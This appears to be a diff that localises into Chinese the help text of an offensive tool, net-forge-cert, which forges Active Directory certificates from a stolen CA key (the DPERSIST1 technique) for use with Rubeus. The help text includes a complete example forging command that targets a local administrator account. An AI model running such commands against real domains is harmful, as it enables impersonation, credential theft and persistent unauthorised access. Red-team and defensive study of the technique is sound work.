@@ -1,12 +1,12 @@
-ABOUT
+关于
     Forges Active Directory authentication certificates using a stolen CA private key
     (.pfx or .p12). Implements DPERSIST1 from Certified Pre-Owned. Output .pfx can be
     used with Rubeus for PKINIT or NT hash recovery.
 
-USAGE:
+用法：
     net-forge-cert --- --CaCertPath <path> --SubjectAltName <UPN> --NewCertPath <path> --NewCertPassword <password> [options]
 
-OPTIONS:
+选项：
     --CaCertPath         Required. CA certificate and private key as .pfx or .p12
     --CaCertPassword     Password for the CA private key file
     --Subject            Subject DN in the forged certificate (default: CN=User)
@@ -16,5 +16,5 @@ OPTIONS:
     --CRL                Optional LDAP path to a CRL for the forged certificate chain
     --Serial             Optional serial number for the forged certificate
 
-EXAMPLES:
+示例：
     net-forge-cert --- --CaCertPath ca.pfx --CaCertPassword "Password123!" --Subject "CN=User" --SubjectAltName "localadmin@theshire.local" --NewCertPath localadmin.pfx --NewCertPassword "NewPassword123!"
